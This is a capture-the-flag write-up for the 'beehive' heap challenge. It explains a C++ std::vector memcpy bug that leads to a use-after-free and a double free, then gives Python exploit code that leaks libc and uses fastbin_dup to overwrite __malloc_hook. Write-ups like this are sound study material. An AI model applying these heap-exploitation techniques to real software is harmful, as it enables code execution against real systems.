### beehive write-up 
###### m4drat - August 25, 2019
__table of contents__:
- [info](#info)
- [reversing](#reversing)
- [vulnerability](#vulnerability)
- [exploitation](#exploitation)
- [tldr](#tldr)

#### info
checksec output:  
![checksec](https://i.imgur.com/g84Ugwp.png)  
1. Binary is 64-bit с++ executable dynamically linked at least with libc
2. binary uses full `RelRO` (relocations read only), so we cant simply overwrite .got entry and jump to one-gadget
3. stack canaries are here too, so we cant use stack-based attacks (without memory leaks)
4. nx-bit enabled, so we cant write our shellcode to rw memory location an later jump to it
5. all we have is that program doesn't have `PIE`, so loaded executable base address is always the same

#### reversing
Binary has some basic (for most heap-related tasks) functionality:
![functionality](https://i.imgur.com/1dgRdwy.png)  
In this particular task it's hard to find bugs by hand so lets go to actual reversing part. After restoring classes such as Note, Day, Calender we can start investigating app logic.  
- `Day` object default constructor:
![day_constructor](https://i.imgur.com/0Ojdt3C.png)  
Its simply creates `std::vector` with `Note *`, and then reserves location for at least `0xd` elements (remember this moment, it will come in handy later). 
- `copy_notes` option:  
![copy_notes](https://i.imgur.com/00VMx4l.png?1)
The most interesting part is in here. First of all it extracts `currentMonth` and `currentDay`, then the same thing happens with the second date. After it `std::vector<Note *>day_notes` ptr for `currentDay` is assigned to `day_notes_current`, same thing happens for the second day, `std::vector<Note *>day_notes` ptr for `newDay` is assigned to `day_notes_new`. And here is, where vuln is introduced.

#### exploitation
So the bug is that vector structures gets copied using `memcpy()` function instead of default copy constructor that can be used through assign operator, what eventually leads to `UAF` and `double-free` vulnerabilities. Lets look at memory layout after using `copy_notes` function.  
![vectors_memory](https://i.imgur.com/O7r6iaw.png)  
As we can see both `std::vector <Note *>` references in `Day` objects are now pointing to the same memory location. And that's the problem. By default `std::vector<>` is a dynamic array that expands as needed, if it expands its must move content to a new memory location and release the old one. So when we make the vector expand (for example using `push_back` in `create_note` function), it will update pointers in `Day` object that is currently selected, but not in the second one, and we will get `UAF`, due to the fact that the second `Day` pointers remained the same.  
With this knowledge we can start creating two primitives: nearly arbitrary `write-what-where`, and `arbitrary-read`.  
Lets start with `arbitrary read`. Easiest way to create this primitive is to use `use-after-free` vulnerability. First of all we must create vector at 1/1, then we will extend it to 13 elements, after it we must copy it to another date (1/3), and later extend it to 14 elements, so location where was 13 pointers is going to be freed in first day. Then we need to free another vector to bypass `fasttop`. After we will select 1/3 and add to this vector one new note with `content_size` = 100, and `content` = `p64(desired_addr) * 12`, so this `note_content` will take memory region, where freed vector content was. And now, when we will call `print_notes` it will print data based on our fake `Note` pointers.  
That's good, but because it's vector of pointers to objects we need to somehow insert pointer to pointer to our location, that we want to read. Fortunately we don't have to do anything, because in the end of reallocated vector will be pointer to heap chunk, with content that we can control.  
Faked `std::vector<Note *>` content (last element is at `0xa84d50`, and that's the fake `Note*` where we can change content, to satisfy double-pointer dereference requirment):  
![FakedArrayContent](https://i.imgur.com/SWgBbpI.png)  
So everything that we need to do now is to change value at controlled location to address we want to read:  
``` python
def generate_vec(cnt, content):
    for i in range(cnt):
        create_note('AAAAAAAA' * 15, content * 12, 100) # spray signal_got on heap to get leak

select_date(1, 1)
generate_vec(13, p64(signal_got)) # controlled location, here will point pointer in the end of faked vector
copy_notes(1, 3)
generate_vec(1, 'PPPPPPPP')       # free first vector

select_date(1, 2)
generate_vec(14, p64(signal_got)) # free second vector to bypass "double free or corruption (fasttop)" + sparay objects with .got['signal'] ptr to leak libc

select_date(1, 3)
create_note('AAAAAAAA', 'DDDDDDDD' * 17, 140)    # double-free first vector + get leak

leak = u64(view_notes()[560:560+6] + '\x00\x00') # read last note name to get leak
```
Now, when we leaked all important addresses we can start creating write primitive. For this we will use `fastbin_dup`:  
First of all we must allocate vector of size 13 (at 2/1), then copy it to (2/2), free it adding new note, then free intermidiate vector (at 2/3) to bypass `faststop`, and later select (2/3) and add new note to double-free it. 
``` python
def generate_vec_param(cnt, name, content_size, content):
    for i in range(cnt):
        create_note(name, content, content_size)

def double_free_fast():
    # first day
    select_date(2, 1)
    generate_vec_param(13, 'AAAAAAAA', 600, 'BBBBBBBB')
    copy_notes(2, 2)
    create_note('NNNN' * 31, 'OOOO' * 24, 600)

    # second day
    select_date(2, 3)
    generate_vec_param(14, 'AAAAAAAA', 600, 'BBBBBBBB')

    # third day
    select_date(2, 2)
    create_note('NNNN' * 31, 'OOOO' * 24, 600)

def exploit_df_fast(chunk_to_get, size):
    select_date(2, 4)
    create_note('AAAAAAAA', p64(chunk_to_get) + 'A' * 38, size)
    create_note('ZZZZZZZZ' * 15, 'MMMMMMMM', size)
    create_note('XXXXXXXX' * 15, 'KKKKKKKK', size)

double_free_fast()
exploit_df_fast(0xdeadbeef, 102)
```
Right now we met almost all the conditions to return arbitrary pointer:  
![bins](https://i.imgur.com/kBt2ejk.png)  
But we cant return fully arbitrary pointer, because there is some integrety checks inside malloc. For example: 
``` c
if (__glibc_likely (victim != NULL))
{
    size_t victim_idx = fastbin_index (chunksize (victim));
    if (__builtin_expect (victim_idx != idx, 0))
        malloc_printerr ("malloc(): memory corruption (fast)");
    check_remalloced_chunk (av, victim, nb);
...
```
This code will check if chunk size, that we are going to return is in specific fastbin range (for this example in range `0x70 <= x <= 0x7f`). So we need to find memory region, that can be represented like `malloc_chunk`, and which size can pass `fastbin_index` check. Okay, we can use only specificly layouted memory. But what we want to write and where? In given binary we can find interesting gadget, that calls `system("/bin/cat /service/flag.txt")`, so we somehow want to redirect execution to this gadget. We can make this by rewriting `__malloc_hook` / `__free_hook` in already leaked libc, but we still need to find suitable chunk near this location. Here i will use pwndbg:  
![fake_chunks](https://i.imgur.com/2MiUDZ1.png)  
It found 2 possible fake_chunks near `malloc_hook`. I will use second one:  
![fake_chunk](https://i.imgur.com/cMdPtIH.png)  
So now, when we will call `new` with appropriate size it will return this fakechunk near `malloc_hook`, and now if we will write something big to this chunk we will rewrite `__malloc_hook`:  
![crash](https://i.imgur.com/cDxCvE7.png?1)  
Got it! Now you just need to change 'A's with gadget address and get flag:  
![flag](https://i.imgur.com/k2d2E6M.png?1)

#### tldr
1. get mem-leak using `UAF`
2. find fake_chunk near `__malloc_hook`
3. return this fake chunk using `fastbin_dup`
4. rewrite `__malloc_hook` with gadget address
5. get flag 

links:  
- [pwndbg find_fake_fastbin module](https://veritas501.space/2018/03/27/调教pwndbg/)  
- [how2heap](https://github.com/shellphish/how2heap/)  
- [phrack](http://phrack.org/issues/61/6.html)  
- [MallocMaleficarum](https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt)  
- [heap exploitation](https://heap-exploitation.dhavalkapil.com)  

<!--
 The first added note will take previously released by vector memory, so now we can control vector content for 1/3
 First content chunk will take already freed by 1 vector location, so we can control content of this vector content field, and later view it using print_notes at 1/3 
-->
